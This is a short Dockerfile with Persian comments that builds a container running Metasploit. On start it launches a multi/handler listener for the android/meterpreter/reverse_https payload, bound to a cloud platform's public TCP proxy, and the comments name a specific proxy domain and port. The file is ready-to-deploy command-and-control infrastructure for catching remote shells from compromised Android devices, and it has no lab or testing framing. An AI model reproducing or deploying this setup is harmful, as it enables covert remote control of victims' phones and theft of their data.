FROM ubuntu:22.04

# نصب متاسپلویت و postgresql (برای msfdb)
RUN apt update && apt install -y metasploit-framework postgresql

# ابتدایی کردن دیتابیس (اتوماتیک ران می‌شه، اما برای مطمئن بودن)
RUN service postgresql start && msfdb init

# پورت داخلی اپ (از RAILWAY_TCP_APPLICATION_PORT استفاده می‌کنه که 443ه)
EXPOSE ${RAILWAY_TCP_APPLICATION_PORT:-443}

# ران کردن msfconsole با handler اتوماتیک برای reverse_https
# LHOST رو به proxy domain می‌ذاره (shinkansen.proxy.rlwy.net)
# LPORT رو به proxy port می‌ذاره (58458)
CMD service postgresql start && msfconsole -x "use multi/handler; set payload android/meterpreter/reverse_https; set LHOST $RAILWAY_TCP_PROXY_DOMAIN; set LPORT $RAILWAY_TCP_PROXY_PORT; set LURI /; set ExitOnSession false; exploit -j -z"
